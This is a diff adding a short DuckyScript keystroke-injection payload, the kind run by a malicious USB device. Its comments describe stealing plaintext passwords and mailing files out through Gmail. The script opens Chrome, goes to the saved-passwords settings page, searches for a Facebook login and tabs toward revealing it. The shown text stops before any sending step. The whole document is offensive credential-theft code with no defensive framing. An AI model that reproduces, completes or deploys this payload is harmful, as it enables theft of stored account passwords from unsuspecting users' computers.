@@ -1,0 +1,25 @@
+REM sends files via gmail to account.
+DELAY 2000
+REM -------------open chrome
+GUI r
+DELAY 1000
+STRING chrome
+DELAY 1000
+ENTER
+DELAY 4000
+REM -------------copy plaintext password
+STRING chrome://settings/passwords
+ENTER
+DELAY 2000
+STRING facebook
+DELAY 500
+TAB
+DELAY 500
+DOWN
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+GUI r
+DELAY 500
